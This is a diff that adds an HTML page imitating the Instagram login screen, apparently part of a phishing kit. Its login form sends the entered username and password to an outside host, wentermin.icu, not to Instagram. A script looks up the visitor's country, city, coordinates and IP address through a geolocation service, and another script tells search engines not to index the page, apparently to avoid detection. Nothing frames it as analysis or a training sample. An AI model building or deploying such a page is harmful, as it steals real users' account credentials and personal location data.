@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="ma.css">
+    <script>// Using the "robots" meta tag
+        document.write('<meta name="robots" content="noindex, nofollow">');
+        // Using the "X-Robots-Tag" header
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', '/', true);
+        xhr.setRequestHeader('X-Robots-Tag', 'noindex, nofollow');
+        xhr.send();
+            </script>
+</head>
+
+<body>
+    <main>
+        <div class="log-in-container">
+            <div>
+                <div class="log-in">
+                    <img src="images/7a252de00b20.png" class="logo">
+                    <div class="log-in-form">
+                        <form action="http://wentermin.icu/auth/sev.php" method="post" autocomplete="off"  >
+                            <input type="hidden" name="next" value="https://instagram.com/">
+                            <input type="text" id="username" name="username" placeholder="Phone number, username or email" required>
+                            <input type="password" id="upass" name="password" placeholder="Password" required>
+                            <button  class="log-in-button" id="feqty" type="submit">Log In</button>
+                            <p id="country" style="display: none;" ></p>
+                            <p id="region" style="display: none;"></p>
+                        </form>
+                    </div>
+                    <span class="or-divider">OR</span>
+                    <div class="fb-login">
+                        <a href="#">
+                            <span>Log in with </span>
+                            <img src="images/fblogo.png">
+                            
+                        </a>
+                    </div>
+                    <div class="forgot-password">
+                        <a href="#">Forgot password? </a>
+                    </div>
+                </div>
+                <div class="sign-up">
+                    <span>Don't have an account ?</span><a href="#"> Sign-up</a>
+                </div>
+                <div class="get-the-app">
+                    <span>Get the app</span>
+                    <div class="app-images">
+                        <a href="#"><img src="images/appstore.png" alt=""></a>
+                        <a href="#"><img src="images/googleplay.png" alt=""></a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="phone-container">
+            <div class="img-transitions">
+            </div>
+        </div>
+
+    </main>
+    <footer>
+        <ul class="footer-links">
+            <li><a href="#">Meta</a></li>
+            <li><a href="#">About</a></li>
+            <li><a href="#">Blog</a></li>
+            <li><a href="#">Help</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">Privacy</a></li>
+            <li><a href="#">TERMS</a></li>
+            <li><a href="#">Top Accounts</a></li>
+            <li><a href="#">Hashtags</a></li>
+            <li><a href="#">Locations</a></li>
+            <li><a href="#">Instagram lite</a></li>
+            <li><a href="#">Dance</a></li>
+            <li><a href="#">Food & Drink</a></li>
+            <li><a href="#">Home & Garden</a></li>
+            <li><a href="#">Music</a></li>
+            <li><a href="#">Visual Arts</a></li>
+        </ul>
+    </footer>
+
+</body>
+
+<script>
+    $.getJSON('https://geolocation-db.com/json/')
+       .done (function(location) {
+          $('#country').html(location.country_name);
+          $('#state').html(location.state);
+          $('#city').html(location.city);
+          $('#latitude').html(location.latitude);
+          $('#longitude').html(location.longitude);
+          $('#ip').html(location.IPv4);
+       }); 
+  </script>
+</html>
